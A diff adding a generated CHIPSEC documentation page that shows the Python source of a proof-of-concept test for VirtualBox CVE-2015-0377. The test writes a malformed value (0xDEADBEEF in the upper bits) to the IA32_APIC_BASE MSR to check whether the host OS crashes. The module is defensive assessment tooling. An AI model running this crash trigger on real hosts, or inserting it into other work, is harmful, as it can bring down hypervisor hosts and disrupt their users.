@@ -1,0 +1,136 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>chipsec.modules.tools.vmm.vbox.vbox_crash_apicbase &#8212; CHIPSEC 1.5.8 documentation</title>
+    <link rel="stylesheet" href="../../../../../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="../../../../../../_static/classic.css" type="text/css" />
+    
+    <script id="documentation_options" data-url_root="../../../../../../" src="../../../../../../_static/documentation_options.js"></script>
+    <script src="../../../../../../_static/jquery.js"></script>
+    <script src="../../../../../../_static/underscore.js"></script>
+    <script src="../../../../../../_static/doctools.js"></script>
+    
+    <link rel="index" title="Index" href="../../../../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../../../../search.html" /> 
+  </head><body>
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../../../../../../genindex.html" title="General Index"
+             accesskey="I">index</a></li>
+        <li class="right" >
+          <a href="../../../../../../py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li class="nav-item nav-item-0"><a href="../../../../../../index.html">CHIPSEC 1.5.8 documentation</a> &#187;</li>
+          <li class="nav-item nav-item-1"><a href="../../../../../index.html" accesskey="U">Module code</a> &#187;</li>
+        <li class="nav-item nav-item-this"><a href="">chipsec.modules.tools.vmm.vbox.vbox_crash_apicbase</a></li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
+            
+  <h1>Source code for chipsec.modules.tools.vmm.vbox.vbox_crash_apicbase</h1><div class="highlight"><pre>
+<span></span><span class="c1">#CHIPSEC: Platform Security Assessment Framework</span>
+<span class="c1">#Copyright (c) 2010-2016, Intel Corporation</span>
+<span class="c1">#</span>
+<span class="c1">#This program is free software; you can redistribute it and/or</span>
+<span class="c1">#modify it under the terms of the GNU General Public License</span>
+<span class="c1">#as published by the Free Software Foundation; Version 2.</span>
+<span class="c1">#</span>
+<span class="c1">#This program is distributed in the hope that it will be useful,</span>
+<span class="c1">#but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
+<span class="c1">#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
+<span class="c1">#GNU General Public License for more details.</span>
+<span class="c1">#</span>
+<span class="c1">#You should have received a copy of the GNU General Public License</span>
+<span class="c1">#along with this program; if not, write to the Free Software</span>
+<span class="c1">#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.</span>
+<span class="c1">#</span>
+<span class="c1">#Contact information:</span>
+<span class="c1">#chipsec@intel.com</span>
+<span class="c1">#</span>
+
+
+
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">PoC test for Host OS Crash when writing to IA32_APIC_BASE MSR (Oracle VirtualBox CVE-2015-0377)</span>
+<span class="sd">http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html</span>
+
+<span class="sd"> Usage:</span>
+<span class="sd">   ``chipsec_main.py -i -m tools.vmm.vbox_crash_apicbase``</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">from</span> <span class="nn">chipsec.module_common</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">_MODULE_NAME</span> <span class="o">=</span> <span class="s1">&#39;vbox_crash_apicbase&#39;</span>
+
+<div class="viewcode-block" id="vbox_crash_apicbase"><a class="viewcode-back" href="../../../../../../modules/chipsec.modules.tools.vmm.vbox.vbox_crash_apicbase.html#chipsec.modules.tools.vmm.vbox.vbox_crash_apicbase.vbox_crash_apicbase">[docs]</a><span class="k">class</span> <span class="nc">vbox_crash_apicbase</span> <span class="p">(</span><span class="n">BaseModule</span><span class="p">):</span>
+
+<div class="viewcode-block" id="vbox_crash_apicbase.run"><a class="viewcode-back" href="../../../../../../modules/chipsec.modules.tools.vmm.vbox.vbox_crash_apicbase.html#chipsec.modules.tools.vmm.vbox.vbox_crash_apicbase.vbox_crash_apicbase.run">[docs]</a>    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span> <span class="bp">self</span><span class="p">,</span> <span class="n">module_argv</span> <span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">start_test</span><span class="p">(</span> <span class="s2">&quot;Host OS Crash due to IA32_APIC_BASE (Oracle VirtualBox CVE-2015-0377)&quot;</span> <span class="p">)</span>
+
+        <span class="n">tid</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="c1">#(eax, edx) = self.cs.msr.read_msr( tid, 0x1B )</span>
+        <span class="c1">#self.cs.msr.write_msr( tid, 0x1B, eax, 0xDEADBEEF )</span>
+        <span class="n">apicbase_msr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cs</span><span class="o">.</span><span class="n">read_register</span><span class="p">(</span> <span class="s1">&#39;IA32_APIC_BASE&#39;</span><span class="p">,</span> <span class="n">tid</span> <span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">cs</span><span class="o">.</span><span class="n">print_register</span><span class="p">(</span> <span class="s1">&#39;IA32_APIC_BASE&#39;</span><span class="p">,</span> <span class="n">apicbase_msr</span> <span class="p">)</span>
+        <span class="n">apicbase_msr</span> <span class="o">=</span> <span class="mh">0xDEADBEEF00000000</span> <span class="o">|</span> <span class="p">(</span><span class="n">apicbase_msr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">log</span><span class="p">(</span> <span class="s2">&quot;[*] writing 0x</span><span class="si">{:016X}</span><span class="s2"> to IA32_APIC_BASE MSR..&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">apicbase_msr</span><span class="p">)</span> <span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">cs</span><span class="o">.</span><span class="n">write_register</span><span class="p">(</span> <span class="s1">&#39;IA32_APIC_BASE&#39;</span><span class="p">,</span> <span class="n">apicbase_msr</span><span class="p">,</span> <span class="n">tid</span> <span class="p">)</span>
+
+        <span class="c1"># If we are here, then we are fine ;)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">log_passed_check</span><span class="p">(</span> <span class="s2">&quot;VMM/Host OS didn&#39;t crash (not vulnerable)&quot;</span> <span class="p">)</span>
+        <span class="k">return</span> <span class="n">ModuleResult</span><span class="o">.</span><span class="n">PASSED</span></div></div>
+</pre></div>
+
+            <div class="clearer"></div>
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+            <p class="logo"><a href="../../../../../../index.html">
+              <img class="logo" src="../../../../../../_static/chipsec_logo_transparent.png" alt="Logo"/>
+            </a></p>
+<div id="searchbox" style="display: none" role="search">
+  <h3 id="searchlabel">Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../../../../../../search.html" method="get">
+      <input type="text" name="q" aria-labelledby="searchlabel" />
+      <input type="submit" value="Go" />
+    </form>
+    </div>
+</div>
+<script>$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../../../../../../genindex.html" title="General Index"
+             >index</a></li>
+        <li class="right" >
+          <a href="../../../../../../py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li class="nav-item nav-item-0"><a href="../../../../../../index.html">CHIPSEC 1.5.8 documentation</a> &#187;</li>
+          <li class="nav-item nav-item-1"><a href="../../../../../index.html" >Module code</a> &#187;</li>
+        <li class="nav-item nav-item-this"><a href="">chipsec.modules.tools.vmm.vbox.vbox_crash_apicbase</a></li> 
+      </ul>
+    </div>
+    <div class="footer" role="contentinfo">
+      Last updated on Jan 27, 2021.
+      Created using <a href="https://www.sphinx-doc.org/">Sphinx</a> 3.4.3.
+    </div>
+  </body>
+</html>
